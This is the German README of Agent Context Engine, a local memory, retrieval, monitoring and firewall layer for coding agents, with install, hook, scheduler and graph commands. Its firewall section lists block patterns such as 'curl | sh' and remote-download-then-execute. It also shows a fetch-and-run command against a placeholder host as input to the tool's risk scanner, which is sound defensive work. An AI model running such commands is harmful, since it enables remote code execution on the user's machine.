<p align="center">
  <img src="docs/assets/agent-context-engine-logo.png" alt="Agent Context Engine Logo" width="220">
</p>

<p align="center">
  <a href="README.md">English</a> | <a href="README_de.md">Deutsch</a>
</p>

<p align="center">
  <img alt="Python" src="https://img.shields.io/badge/Python-3.11%2B-3776AB?logo=python&logoColor=white">
  <img alt="Node.js" src="https://img.shields.io/badge/Node.js-20%2B-339933?logo=node.js&logoColor=white">
  <img alt="License" src="https://img.shields.io/badge/License-Apache%202.0-D22128">
  <img alt="macOS" src="https://img.shields.io/badge/macOS-active%20runtime%20target-000000?logo=apple&logoColor=white">
  <img alt="Windows" src="https://img.shields.io/badge/Windows-experimenteller%20Runtime%20Pfad-0078D4?logo=windows&logoColor=white">
</p>

# Agent Context Engine

Lokale, harness-übergreifende Context-Engine für Coding-Agents mit Memory,
Retrieval, Tracing, Zusammenfassungen und Safety Controls.

Agent Context Engine erfasst Agenten-Sessions über unterstützte Runner hinweg,
hält die Laufzeit lokal und inspizierbar und gibt dir Retrieval, kompakte
Handovers, Monitoring, Graph-Extraktion und firewall-artige Sicherheitsregeln,
ohne Cloud-Infrastruktur vorauszusetzen.

Lizenziert unter der Apache License, Version 2.0. Siehe [LICENSE](LICENSE),
[NOTICE](NOTICE) und [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).

Erstellt und gepflegt von [Frank Richter](https://www.linkedin.com/in/frank-richter-24657078/).

Aktuelle öffentliche Versionen:

- Backend / Produkt: `0.2.8`
- Monitor: `0.6.6`

Plattformstatus:

- macOS: unterstützter aktiver Runtime-Pfad
- Windows: experimenteller nativer Runtime-Pfad mit `.cmd`- und PowerShell-Adaptern
- Linux / WSL / generisches POSIX: weiterhin nur scaffolded

Siehe [CHANGELOG.md](CHANGELOG.md) für die Release-Historie seit dem ersten öffentlichen Release.

## Was Es Tut

- erfasst Sessions, Prompts, Tools und Runtime-Events über Hooks
- speichert lokales Memory für Retrieval über frühere Arbeit hinweg
- baut kompakte Handovers und dream-basierte Kontextverdichtung auf
- stellt einen lokalen Monitor für Sessions, Risiken, Storage, Integrationen und Graph-Status bereit
- erzwingt Safety Controls für riskante Tool-Aufrufe und Memory-Retrieval
- unterstützt Cross-Harness-Workflows für Codex, Claude Code, Cursor, Gemini, Antigravity und OpenCode

## Schnellstart

Aus einem frischen Clone:

```sh
python3 scripts/agent_context_engine.py install
```

Der Installer führt zuerst eine reine Discovery aus, schlägt Ziel-Root,
Memory-Root, Monitor-Port, Wrapper-Namensschema und LaunchAgent-Verhalten vor
und wartet vor jeder schreibenden Änderung auf explizite Zustimmung.

Nach der Installation:

```sh
cd /path/to/agent-context-engine-root
agent-context-engine doctor
agent-context-engine check-installation
agent-context-engine launchagent-status
```

## Wie Es Funktioniert

1. Hooks erfassen Session-Aktivität aus unterstützten Runnern.
2. Lokales Storage hält Events, Zusammenfassungen, Tool-Metadaten,
   Retrieval-Indizes und Safety-Auditdaten.
3. Retrieval- und Handover-Flows machen frühere Arbeit wieder nutzbar.
4. Hintergrund-Scheduling hält Summaries, Dreams, Graph-Extraktion und Wartung am Laufen.
5. Der lokale Monitor bündelt Runtime-Zustand, Integrationen, Risiken und Storage.

## Dokumentation

- [Overview](docs/overview.md)
- [System Overview](docs/architecture/SYSTEM_OVERVIEW.md)
- [Activation Model](docs/setup/activation-model.md)
- [Central Installation Mode](docs/setup/central-installation-mode.md)
- [Runner And Harness Guide](docs/setup/RUNNER_HARNESSES.md)
- [Build And Checks](docs/setup/BUILD_AND_CHECKS.md)
- [Monitor Operator Workflows](docs/runbooks/monitor-operator-workflows.md)
- [Project Origin](docs/project-origin.md)
- [German README](README_de.md)

## Für Agents

- [AGENT_BOOTSTRAP.md](AGENT_BOOTSTRAP.md): geführter Installationsvertrag für agentische Setups
- [session-start-hook-entry.md](session-start-hook-entry.md): Retrieval- und Kontext-Workflow zum Session-Start
- [SKILL.md](SKILL.md): paketierte Skill-Anweisungen

## Entwicklung

Zentrale Checks:

```sh
./scripts/check --skip-runtime-db
python3 -m unittest discover -s tests -v
./scripts/audit
```

Dependencies sind nach Zweck getrennt:

- `backend/requirements-runtime.txt`
- `backend/requirements-build.txt`
- `backend/requirements-audit.txt`

## Repository-Struktur

- `backend/`: Python-Backend, CLI, Hooks, Runtime-Logik, Monitor-API und Storage-Modell
- `frontend/`: Monitor-UI
- `scripts/`: Wrapper, Checks, Audits und lokale Operator-Helfer
- `templates/`: Hook-Templates für unterstützte Runner
- `contracts/`: OpenAPI-Vertrag und Interface-Spezifikationen
- `docs/`: öffentliche Setup-, Architektur-, Runbook- und Produktdokumentation

## Installation In Ein Zielprojekt

Wenn noch kein Ziel gewählt wurde:

```sh
python3 scripts/agent_context_engine.py install
```

Der Installer erklärt, was Agent Context Engine tut, warum es den Workflow
verbessert, lässt den Source-Checkout standardmäßig unverändert, schlägt die
zentrale Installation unter `~/.agent-context-engine/install` sowie den
passenden Runtime-Storage unter `~/.agent-context-engine/memory` vor und zeigt
den exakten Installationsbefehl. Die geführten Defaults verlinken die
öffentlichen Kommandos `agent-context-engine`, `ace` und die `*-ace`-Wrapper
auf die gewählte Installation, bootstrappen die lokale Runtime und starten den
Monitor nach der Installation.

Wenn Discovery bereits auf das zentrale Default-Ziel
`~/.agent-context-engine/install` zeigt, bleibt das der Standardplan, auch wenn
 der aktuelle Checkout ein frischer Clone ist. Der Checkout selbst bleibt
unverändert, außer der Nutzer wählt explizit ein anderes `--target`.

Agent Context Engine führt außerdem ein zentrales Monitor-Runtime-Register unter
`~/.agent-context-engine/monitor-runtime.json`. Jeder Monitor-Start schreibt
Instanz, Host, Port, PID und Zeitstempel hinein, damit spätere Discovery-Läufe
bekannte aktive Ports vermeiden können. Direkt vor dem Schreiben des
Install-Profils erfolgt zusätzlich noch einmal eine finale Port-Abstimmung.

```sh
python3 scripts/agent_context_engine.py install \
  --target /path/to/agent-context-engine-root \
  --project "project-a=/path/to/project-a" \
  --project "project-b=/path/to/project-b" \
  --link-codex-ace \
  --link-claude-ace \
  --link-agy-ace \
  --link-gemini-ace \
  --link-opencode-ace \
  --force
```

Das installiert unter anderem:

```text
<target>/AGENTS.md (neu oder ergänzt mit dem Agent Context Engine Quick Path)
<target>/scripts/
<target>/.codex/hooks.json
<target>/.codex/hooks/hook_adapter.sh oder hook_adapter.cmd
<target>/.claude/settings.json
<target>/.claude/hooks/hook_adapter.sh oder hook_adapter.cmd
<target>/docs/knowledge/repos.md
```

Der `AGENTS.md`-Block weist zukünftige Agents an, zuerst
`agent-context-engine search`, `handover`, `last` und `doctor` zu nutzen,
bevor bei Fragen zu früheren Sessions oder vorhandener Analyse breit im Repo
oder Dateisystem gesucht wird.

Behalte `agent-context-engine` als kanonischen agentenseitigen CLI-Pfad in
installierten Projekten. Dupliziere die Scripts nicht in andere Projekte;
Wrapper-Kommandos sollen genau diesen Pfad aufrufen. Aufrufe über diesen Pfad
sind aus synchroner LLM-Klassifikation allowlisted, werden aber weiterhin
protokolliert und deterministisch gescannt.

Mit Wrapper-Link-Flags können zusätzlich entstehen:

```text
~/.local/bin/agent-context-engine -> <target>/scripts/agent-context-engine
~/.local/bin/codex-ace -> <target>/scripts/codex-ace
~/.local/bin/claude-ace -> <target>/scripts/claude-ace
~/.local/bin/agy-ace -> <target>/scripts/agy-ace
~/.local/bin/gemini-ace -> <target>/scripts/gemini-ace
~/.local/bin/opencode-ace -> <target>/scripts/opencode-ace
```

Unter Windows werden diese öffentlichen Kommandos als generierte `.cmd`-Shims
statt als Symlinks veröffentlicht.

Für eine zweite unabhängige Installation auf demselben Mac nutze den
isolierten Modus, damit bestehende globale Kommandos nicht ersetzt werden:

```sh
python3 scripts/agent_context_engine.py install \
  --target /path/to/second-agent-context-engine-root \
  --isolated \
  --link-codex-ace \
  --link-claude-ace \
  --link-agy-ace \
  --link-gemini-ace \
  --link-opencode-ace
```

`--isolated` setzt standardmäßig:

- target-lokales Runtime-Storage unter `<target>/memory`
- einen automatisch abgeleiteten Instanznamen und präfixierte Wrapper-Namen
- keine Übernahme der geteilten `agent-context-engine`-, `ace`- oder ungepräfixten `*-ace`-Kommandos

Der lokale CLI-Pfad bleibt dabei root-spezifisch:
`/path/to/second-agent-context-engine-root/scripts/agent-context-engine`.

Wenn ein Agent die Installation aus einer eingeschränkten Umgebung treibt,
überinterpretiere keine Health-Checks gegen eine bestehende zentrale
Installation vor der Freigabe. Meldungen wie `Operation not permitted`, ein
zeitweise nicht schreibbarer Home-Pfad oder `unable to open database file`
sind zunächst nur permission-limited Signale.

Falls `docs/knowledge/repos.md` fehlt, legt der Installer sie an. Bekannte
Projekte können mit wiederholtem `--project "name=/absolute/path"` übergeben
werden. Für Automation verwende `--no-interactive`.

Wenn das Ziel bereits von Agent Context Engine verwaltete Dateien enthält,
verweigert der Installer das Überschreiben ohne `--force`. Für eine zweite
Installation bevorzuge `--instance-name`. Für Client-Aktivierung in einem
anderen Projekt nutze `cursor-enable`, `antigravity-enable`, `gemini-enable`
oder `opencode-enable` statt einer Neuinstallation.

Für `codex`, `claude` und `cursor` müssen zwei Zustände getrennt betrachtet werden:

- `GUI hooks only`: Das Workspace-Root enthält die Hook-Dateien und die GUI kann sie lokal ausführen.
- `headless CLI ready`: Die passende CLI ist ebenfalls auf dem System vorhanden, sodass Wrapper, Monitor-Ask und Dreaming laufen können.

Nutze `--codex-workspace-root`, `--claude-workspace-root` und
`--cursor-workspace-root`, wenn das tatsächliche GUI-/Editor-Workspace vom
zentralen Agent-Context-Engine-Root abweicht.

Bei separaten GUI-Workspaces müssen die erzeugten Codex-/Claude-/Gemini-
Hook-Adapter explizit auf den zentralen Root zurückzeigen. Deshalb werden sie
mit absoluten `ROOT`- und `SCRIPT`-Pfaden geschrieben.

Der Installer ist außerdem workflow-aware. Mit `--monitor-runner`,
`--dream-runner` und `--query-expansion-runner` wird festgehalten, wofür das
Setup tatsächlich gedacht ist. `check-installation` liest dieses Profil später
und kann dann erklären, wenn GUI-only-Nutzung nicht ausreicht, weil ein
gewählter Headless-Workflow noch die passende Terminal-CLI benötigt.
`repair-installation --apply` bleibt auch hier konservativ: Wenn ein externer
Workspace-Adapter bereits auf ein anderes Root oder Script zeigt, meldet der
Befehl das zuerst und schreibt erst mit
`--rewrite-workspace-hook-adapters` tatsächlich um.

## Nach Der Installation

### Codex

```sh
cd <target>
agent-context-engine doctor
agent-context-engine check-installation
agent-context-engine doctor --relocation-report
codex-ace
```

`doctor --relocation-report` ist nach dem Kopieren eines vorhandenen `memory/`
Ordners in ein neues Root hilfreich. Die SQLite-Daten bleiben lesbar, aber
historische `cwd`-/`last_workdir`-/`transcript_path`-Werte können noch auf den
alten Ort zeigen.

Wenn du nur ein Codex-GUI-/Editor-Workspace nutzt, funktionieren die Hook-Dateien
möglicherweise auch ohne separate Headless-CLI. Aber `codex-ace`, `codex exec`,
Monitor-Ask mit Runner `codex` und Dreaming benötigen weiterhin die Codex-CLI
auf dem Rechner. In der Praxis heißt das meist auch ein terminalseitiges
`codex login` vor der ersten Headless-Nutzung. Dasselbe gilt für Claude Desktop
vs. `claude` und Cursor-GUI-Hooks vs. `cursor-agent`.

Beim Codex-`SessionStart` injiziert der Projekt-Hook nur einen kurzen
deterministischen Aktivierungshinweis. Frühere Sessions werden standardmäßig
nicht sichtbar in den Chat geschrieben. Nutze `agent-memory last`, `folder`,
`use <session_id>` oder `handover <session_id>`, wenn der Nutzer nach früherer
Arbeit fragt. Der `codex-ace`-Wrapper konserviert den ursprünglichen Startordner
in `AGENT_MEMORY_LAUNCH_CWD`.

Personal Operating Memory liegt als lesbares Markdown in `memory/personal/`.
Im kompakten Startup-Modus meldet der Hook nur, dass startup-sicheres Personal
Memory verfügbar ist; mit `AGENT_MEMORY_STARTUP_CONTEXT=full` werden nur Dateien
mit `injection_policy: startup_safe` und `sensitivity: normal` injiziert.

Für Debugging:

```sh
AGENT_MEMORY_STARTUP_CONTEXT=full codex-ace
```

Personal-Memory-Kommandos:

```sh
agent-context-engine personal init
agent-context-engine personal list
agent-context-engine personal list --startup-safe
agent-context-engine personal show engineering/architecture
agent-context-engine personal propose engineering/architecture "- Prefer aggregate boundaries for DDD contexts."
agent-context-engine personal proposals
agent-context-engine personal accept <proposal_id>
agent-context-engine personal audit
```

Retrieval mit Provenance:

```sh
agent-context-engine retrieve "github analyse projekt" --limit 10
agent-context-engine retrieve "hexagonale architektur ddd" --kind personal_memory --limit 10
agent-context-engine retrieve "secrets personal memory" --include-risky --json
agent-context-engine retrieve "hexagonale architektur" --query-expansion llm --expander-runner codex
```

Nutze `retrieve` für agentische Arbeit, wenn die Antwort nachvollziehbar sein
soll. Der Befehl kombiniert Session-Lookup, Markdown-/FTS-Chunks und
materialisierte Graph-Entities und protokolliert die Anfrage in
`retrieval_runs`, `retrieval_results` und `memory_access_log`.

Session-Report:

```sh
agent-context-engine analyze <session_selector> --json
agent-context-engine analyze <session_selector> --html --open
```

`analyze` (`analyse`) erzeugt einen kompakten, qualitätsorientierten
Session-Report mit Themenextraktion, Timeline, Metriken, Dream-Runs,
Entities/Relations, Risk-Events, Firewall-Aktivität und Quality-Score.

Folder-Lookup:

```sh
agent-context-engine folder /path/to/project --limit 20
agent-context-engine last --folder /path/to/project --limit 20
```

Optionaler Verifikationsschritt: Öffne in Codex `/hooks`, um installierte und
aktive Projekt-Hooks zu prüfen. Wenn Codex nach Installations- oder Hook-
Änderungen eine Hook-Sicherheitsprüfung zeigt, prüfe die aufgeführten
Kommandos und gib sie dort frei.

Vollständiger Package-Smoke-Test:

```sh
./scripts/check-agent-context-engine --include-retrieval-evals
```

### Claude Code

```sh
claude-ace
```

Symlink:

```text
~/.local/bin/claude-ace -> <target>/scripts/claude-ace
```

Die Hook-Konfiguration unter `<target>/.claude/settings.json` wird von Claude
Code automatisch geladen, wenn das Working Directory `<target>` ist.

### Cursor IDE

Cursor Memory ist projektlokal und pro geöffnetem Ordner opt-in:

```sh
cd <target>
agent-context-engine cursor-enable
```

Aus dem zentralen Agent-Context-Engine-Root kann ein anderes Projekt ohne
Skill-Kopie aktiviert werden:

```sh
agent-context-engine cursor-enable \
  --target /path/to/project \
  --installation-root /path/to/agent-context-engine-root
```

Um Claude statt des automatisch gewählten Headless-Runners festzunageln:

```sh
agent-context-engine cursor-enable \
  --target /path/to/project \
  --installation-root /path/to/agent-context-engine-root \
  --background-runner claude
```

Cursor-Aktivierung benötigt `codex` oder `claude` auf dem System für
hintergründige LLM-Workflows. Cursor selbst liefert IDE-seitige Hooks und
Session-Capture; Codex oder Claude übernehmen Firewall-Klassifikation,
Dreaming, Query Expansion und andere Headless-Verarbeitung. Wenn
`--background-runner` verwendet wird, muss der gewünschte Runner installiert
und authentifiziert sein.

Es entstehen oder werden gemerged:

```text
<target>/.cursor/hooks.json
<target>/.cursor/hooks/hook_adapter.sh
```

Deaktivieren:

```sh
agent-context-engine cursor-disable
agent-context-engine cursor-disable --target /path/to/project
```

Status prüfen:

```sh
agent-context-engine cursor-status
agent-context-engine cursor-status --target /path/to/project
```

Nach Enable oder Disable das Cursor-Fenster neu laden oder das Projekt neu
öffnen. Die Kommandos erhalten nicht von Agent Memory stammende Cursor-Hooks,
indem nur die `./.cursor/hooks/hook_adapter.sh`-Einträge entfernt werden.
Für externe Cursor-Projekte gilt `cursor-status --target /path/to/project` als
autoritative Aktivierungsprüfung.

Cursor-`afterAgentResponse`-/`stop`-Payloads enthalten Token-Usage und
Modell-Metadaten. Der Hook schreibt diese Werte in `token_usage` und
`turn_metrics`.

## Monitor

Starte einen read-only lokalen Web-Monitor:

```sh
agent-context-engine monitor --runner codex --port 8787
agent-context-engine monitor --runner codex --port 8787 --language de
agent-context-engine monitor --runner claude --port 8787
agent-context-engine monitor --runner cursor --port 8787
```

Beim Start prüft der Monitor, ob `frontend/dist` fehlt oder stale ist, und
versucht gegebenenfalls automatisch einen lokalen Rebuild. Falls `node_modules/`
für das Frontend fehlen:

```sh
agent-context-engine repair-installation --apply --install-frontend-deps
```

Der Monitor bindet standardmäßig an `127.0.0.1` und öffnet
`http://127.0.0.1:<port>/`.

Er bietet unter anderem:

- Status-Polling für Sessions, Events, Hook-Queue, ausstehende Summaries und Dreams
- read-only Memory Q&A über den gewählten Runner ohne Tools
- SQLite-FTS-Suche über indexierte Summaries, Dreams und Projekt-Memories
- Session-Tabelle mit Paging, Agent/Client, Titel, Brief, Summary-Preview,
  Zeitstempeln, Projekt-/Arbeitsordner, Aktivitätsstatus, Dream-Status,
  Session- und Dream-Token-Totals sowie Risk-/Taint-Posture
- modale Session-Detailansicht mit Summary, Dream-Runs, Risk-&-Blocks-Bereich
  und chronologischem Event-Flow aus SQLite
- D3-Graph-Ansichten aus materialisierten SQLite-Graph-Tabellen
- Dream-Run-Inspektion mit Dauer, Runner-Modell, Event-Bereichen und Token-Metriken
- Firewall-/Quarantine-Ansichten inklusive Review, Override-Historie,
  Klassifikator-Feedback und Risk-Graphen
- stündliche Token-Statistiken
- optionalen Neo4j-Graph-Source, wenn `AGENT_MEMORY_NEO4J_PASSWORD` gesetzt ist

Der Q&A-Endpunkt baut einen kleinen Retrieval-Prompt aus SQLite-FTS-Chunks und
lokalem Graph-Kontext und ruft dann den gewählten Runner im no-tools/read-only-
Modus auf.

## Runtime-Datenbank

Für jede Installation liegt die SQLite-Datenbank unter:

```text
<agent-context-engine-root>/memory/status/agent-memory.sqlite3
```

Portable Dokumentation sollte den relativen Pfad
`memory/status/agent-memory.sqlite3` verwenden. Die Datenbank ist der lokale
operative Index für Sessions, Events, normalisierte Tool-Aufrufe/-Outputs,
Token-Usage, Scheduler-Auditzeilen, Dream-Runs, FTS-Retrieval-Chunks und
materialisierte Graph-Entities/Relations/Evidence.

Zeitstempel werden in UTC gespeichert. Monitor-UI und menschenorientierte
CLI-Ausgaben wie `last`, `status`, `tool-calls`, `file-accesses`, `risk list`
und `risk explain` rendern sie in der lokalen Zeitzone des Browsers oder der
Shell. JSON-Ausgabe bleibt unverändert in UTC.

Rohdaten von Tool-Outputs werden nicht persistiert. `tool_outputs` hält nur
Metadaten wie Status, Größe, Zeilenzahl und Hash, damit `tool_calls` auditierbar
bleibt, ohne potenziell geheime Output-Inhalte dauerhaft zu speichern.

SQLite nutzt WAL, einen Busy-Timeout von 15 Sekunden und Retries auf
transiente `database is locked` / `database is busy`-Fehler. Falls ein Hook
nach Retries noch immer nicht schreiben kann, landet das Payload in
`memory/events/queue/<client>/*.json`; `scheduler-run` replayt diese Queue vor
`sync-transcripts`.

## Memory Firewall

Der Firewall-Pfad ist deterministisch zuerst und schreibt Klassifikator-
Auditzeilen zur späteren Überprüfung.

Zentrale Regeln:

- `PreToolUse` bzw. Cursor-`beforeShellExecution` scannt Tool-Input vor der Ausführung
- harte Blocks müssen für Codex `exit 2` plus sichtbaren stderr-Reason liefern
- rohe Tool-Output-Texte werden nicht persistiert
- Memory-Indexierung scannt Kandidaten, bevor sie retrievable Chunks werden
- Personal-Memory-Proposals durchlaufen denselben Klassifikationspfad
- `retrieve` klassifiziert den Kontext, den es gleich ausgeben würde
- Retrieval schließt medium/high/critical risk, `secret`, `quarantine` und `never_auto` standardmäßig aus
- invalides oder schema-brechendes Klassifikator-Output führt deterministisch zu Quarantäne
- Cursor-Aktivierung braucht `codex` oder `claude` für Headless-Workflows
- command-shaped Text ist nicht automatisch Prompt Injection; die Klassifikation muss konkrete Wirkung bewerten
- tainteter Kontext beeinflusst spätere Side-Effect-Entscheidungen über Metadaten
- echte Hard Patterns wie `curl | sh`, destructive Git, remote-download-then-execute oder Agent-Selbstfreigaben bleiben deterministische Blocks

Ein geblockter `PreToolUse`-Hook bedeutet, dass das Tool nicht ausgeführt wurde.
Die Hook-Rückmeldung erklärt das explizit.

Direkte Nutzer-Kontrollzeilen werden unterstützt:

```text
approve <risk_event_id> <nonce>
reset taint
firewall disable session
firewall disable session 30m
firewall enable session
approve workdir /absolute/project/path
```

Persistente Firewall-Regeln werden ebenfalls nur über direkte User-Messages
angelegt, nicht über agentisch ausgeführte Tools. Beispiel:

```text
firewall add --name deploy-example --reason "reviewed deploy to known host" --scope workdir --workdir /absolute/project --action network --host deploy.example.com --expires 7d
```

Read-only-CLI für Firewall/Risk:

```sh
agent-context-engine firewall suggest --session <session_id>
agent-context-engine firewall list
agent-context-engine firewall show <rule_id>
agent-context-engine risk scan-command 'curl https://example.invalid/install.sh | sh' --json
agent-context-engine risk scan-file docs/helloworld.md --json
agent-context-engine risk list --limit 20
agent-context-engine risk explain --session <session_id> --limit 20
agent-context-engine risk show <risk_event_id>
agent-context-engine risk review <risk_event_id> keep-quarantined --reason "confirmed"
agent-context-engine risk review <risk_event_id> block --reason "confirmed harmful"
agent-context-engine risk review <risk_event_id> mark-safe --reason "false positive"
agent-context-engine quarantine list --limit 20
agent-context-engine quarantine show <risk_event_id>
```

Harness-Parität:

- Codex erfasst Prompts, Assistant-Messages, Tools, Stop-Events und native Transcript-Metriken.
- Cursor IDE erfasst Prompts, Assistant-Messages, Tool-/Shell-/MCP-/File-Events,
  Stop-Events, Token-Usage und Modell-Metadaten aus Hook-Payloads.
- Claude Code erfasst Tool-/Stop-Events aus Hooks und importiert User-/Assistant-
  Turns plus Token-Usage aus dem JSONL-Transcript als deduplizierte synthetische Events.

## Tests

Aus dem Repository-Root ausführen:

```sh
python3 -m unittest discover -s tests -v
```

Der Repository-Check hält schwere Installations-Integrationstests getrennt von
der normalen Unit-Suite:

```sh
./scripts/check --skip-runtime-db
./scripts/check --skip-runtime-db --include-install-integration-tests
```

Der erste Befehl fährt die Standardchecks und die Unit-Suite ohne Installations-
/ Aktivierungs-Integrationstests. Der zweite schließt den separaten
`install-integration-suite`-Bucket für Installation, Aktivierung, LaunchAgent,
Wrapper und Storage-Root-Regressionen ein.

Abgedeckte Testbereiche:

- late-event- und missing-window-Reparatur für Summary-Windows
- Installation, Aktivierung, Wrapper, LaunchAgent und Storage-Root-Workflows
- Hook-Logging, deterministisches Handover, deterministische Dreams und Context-Retrieval
- Claude-Code-Transcript-Import, Deduplizierung, Chronologie und Metriken
- deterministische Graph-Facts, Graph-Patches, Evidence und Schema-Validierung
- Memory-Firewall-Schema, CLI-Scans, PreToolUse-Blocking, Klassifikator-Auditzeilen und Default-Retrieval-Filterung von Quarantäne-Memory

## LaunchAgent

macOS-Scheduler installieren und laden:

```sh
agent-context-engine install-launchagent --load
```

Für normale Restart-/Reload-Operationen den Wrapper mit kontrollierten Defaults nutzen:

```sh
./scripts/restart-launchagent
```

`agent-context-engine install-launchagent --load` installiert die normalen
Scheduler-Defaults für die aktive Installation. `./scripts/restart-launchagent`
bleibt ein separater Hybrid-Wrapper für deterministische Dream-Verarbeitung plus
optionale LLM-Graph-Strukturierung.

Default-Verhalten:

- Label: `com.agent-context-engine.<project-folder>`
- Interval: 900 Sekunden
- Command: `scheduler-run --grace-minutes 5 --runner same-as-session --graph-runner same-as-session`
- Plist: `~/Library/LaunchAgents/com.agent-context-engine.<project-folder>.plist`
- optionales lokales Env-File: `memory/local/agent-context-engine.env` (gitignored)
- Logs:
  - `memory/logs/launchagent.out.log`
  - `memory/logs/launchagent.err.log`

Hybrid-Wrapper-Defaults (`./scripts/restart-launchagent`):

- Dream runner: `deterministic` (fix)
- Graph runner: standardmäßig `deterministic`, per `--graph-runner` überschreibbar
- Interval: 300 Sekunden
- Neo4j sync: standardmäßig aus

Bei mehreren Agent-Context-Engine-Instanzen mit gleichem Ordnernamen ein
explizites Label wählen und für Status/Uninstall konsistent verwenden:

```sh
agent-context-engine install-launchagent --label com.agent-context-engine.client-a --load
agent-context-engine launchagent-status --label com.agent-context-engine.client-a
```

Inspektion oder Entfernung:

```sh
agent-context-engine launchagent-status --verbose
agent-context-engine scheduler-status --limit 10
agent-context-engine uninstall-launchagent
```

Stop-Hooks stoßen standardmäßig auch einen debounced Background-Scheduler an.
Der Scheduler verwendet einen globalen Lock, sodass wiederholte Hook-Events nur
einen aktiven Worker starten. Das lässt sich mit
`AGENT_MEMORY_AUTO_WORKER_ON_HOOK=0` abschalten.

Der erste abgeschlossene Agent-Turn einer Session queued standardmäßig einen
schnellen initialen Dream:

```text
AGENT_MEMORY_INITIAL_DREAM_ON_PROMPT=1
AGENT_MEMORY_INITIAL_DREAM_RUNNER=same-as-session
AGENT_MEMORY_INITIAL_DREAM_TIMEOUT=60
```

Stop-getriggerte Dreams laufen asynchron. Standardmäßig gilt:

```text
AGENT_MEMORY_STOP_DREAM_RUNNER=same-as-session
AGENT_MEMORY_STOP_DREAM_TIMEOUT=180
```

Der Scheduler reconciled stale `dream_runs`: Hängt ein Run noch auf `running`,
ist älter als `AGENT_MEMORY_STALE_DREAM_RUN_SECONDS` und es existiert kein
aktiver `dream-session`-Lock mehr, markiert Agent Context Engine den Run und
alle zugehörigen `dream_stage_runs` als fehlgeschlagen und setzt die Session je
nach Event-Coverage auf `dream_pending` oder `dreamed` zurück.

Dream-Modell-Defaults:

```text
AGENT_MEMORY_CODEX_DREAM_MODEL=gpt-5.4-mini
AGENT_MEMORY_CLAUDE_DREAM_MODEL=claude-haiku-4-5-20251001
AGENT_MEMORY_CURSOR_DREAM_MODEL=gpt-5.4-mini-medium
```

Override pro Run:

```sh
agent-context-engine dream --pending --runner codex --runner-model gpt-5.4-mini
agent-context-engine dream --pending --runner cursor --runner-model sonnet-4
agent-context-engine dream --pending --runner deterministic --graph-runner codex --graph-runner-model gpt-5.4-mini
```

## Graph-Artefakte

Die Graph-Schicht ist Markdown-/SQLite-first und Neo4j-optional. Sie schreibt
parsebare JSON-Artefakte, die später in Neo4j importiert werden können.

```sh
agent-context-engine graph-extract <session>
agent-context-engine graph-structure <session>
agent-context-engine graph-structure <session> --runner same-as-session
agent-context-engine graph-status --limit 10
agent-context-engine graph-validate memory/graph/patches/<patch>.json
agent-context-engine graph-query sessions --limit 10
agent-context-engine graph-query entities "Neo4j"
agent-context-engine graph-query entity "agent-memory"
agent-context-engine graph-query related "019e1696"
agent-context-engine graph-schema-context --format json
agent-context-engine graph-candidates memory/graph/patches/<patch>.json
agent-context-engine graph-match-candidates memory/graph/candidates/<candidates>.json
agent-context-engine graph-reconcile memory/graph/candidates/<candidates>.json --matches memory/graph/matches/<matches>.json
agent-context-engine handover "agent-memory"
agent-context-engine use "agent-memory"
agent-context-engine neo4j-import memory/graph/patches/<patch>.json --dry-run
agent-context-engine rebuild-indexes
```

Nutze `handover` oder `use` als Standardkommando für agentische Fortsetzung. Es
zeigt die aufgelöste Session, Projekt-Workdir, Freshness-Status,
Summary-/Dream-Artefakte, Metriken, die jüngere Timeline, aktuelle Tools und
konkrete Hinweise für die Fortsetzung im laufenden `codex-ace`-Chat.

Outputs:

```text
memory/graph/facts/*.json
memory/graph/patches/*.json
memory/graph/llm-runs/<dream_run_id>/*
memory/graph/candidates/*.json
memory/graph/matches/*.json
memory/graph/reconciled/*.json
```

`search` und `handover`/`use` lesen aus dem SQLite-Chunk-Index,
`graph-query` aus den materialisierten SQLite-Graph-Tabellen. JSON-Dateien
bleiben die portablen Audit-Artefakte; SQLite ist die schnelle lokale
Retrieval-Schicht.

Verarbeitete Graph-Artefakte können nach Materialisierung in SQLite bereinigt
werden:

```sh
agent-context-engine graph-prune
agent-context-engine graph-prune --archive memory/graph-artifacts.tar.gz
agent-context-engine graph-prune --archive memory/graph-artifacts.tar.gz --delete
agent-context-engine graph-prune --delete --include-pending-neo4j
```

Jede Entity und Relation muss Evidence mitführen, etwa Session-ID,
Event-Sequenz, Source-Feld und ein kurzes Quote. Nach jedem erfolgreichen
Markdown-Dream läuft eine zweite Graph-Structuring-Phase mit demselben Runner
und Modell wie der Dream selbst.

Optionaler Neo4j-Import nutzt die HTTP-Transaction-API und benötigt nicht den
Python-Neo4j-Driver:

```sh
export AGENT_MEMORY_NEO4J_PASSWORD='...'
agent-context-engine neo4j-status --uri http://127.0.0.1:7474 --database agenticMemory
agent-context-engine neo4j-install-schema --uri http://127.0.0.1:7474 --database agenticMemory
agent-context-engine neo4j-import memory/graph/patches/<patch>.json --uri http://127.0.0.1:7474 --database agenticMemory
agent-context-engine neo4j-sync-pending --uri http://127.0.0.1:7474 --database agenticMemory
agent-context-engine neo4j-import-status --uri http://127.0.0.1:7474 --database agenticMemory
```

Lokale Credentials für LaunchAgent-basierten Sync gehören in
`memory/local/agent-context-engine.env`:

```text
AGENT_MEMORY_NEO4J_URI=http://127.0.0.1:7474
AGENT_MEMORY_NEO4J_DATABASE=agenticMemory
AGENT_MEMORY_NEO4J_USER=neo4j
AGENT_MEMORY_NEO4J_PASSWORD=...
```

```sh
agent-context-engine install-launchagent --load
```

## Implementierungs-Layout

```text
scripts/agent_context_engine.py
scripts/agent-context-engine
backend/src/agent_context_engine/interfaces/cli/main.py
backend/src/agent_context_engine/interfaces/hooks/main.py
backend/src/agent_context_engine/interfaces/http/server.py
backend/src/agent_context_engine/interfaces/http/html.py
backend/src/agent_context_engine/infrastructure/config.py
backend/src/agent_context_engine/infrastructure/db.py
backend/src/agent_context_engine/infrastructure/locks.py
backend/src/agent_context_engine/application/dream.py
backend/src/agent_context_engine/application/dreaming/
backend/src/agent_context_engine/application/graph/
backend/src/agent_context_engine/application/graphing/
backend/src/agent_context_engine/application/monitoring/
backend/src/agent_context_engine/adapters/runners/
backend/src/agent_context_engine/adapters/sqlite/
backend/src/agent_context_engine/adapters/neo4j/sync.py
contracts/openapi.yaml
frontend/src/shared/api/generated/types.ts
```
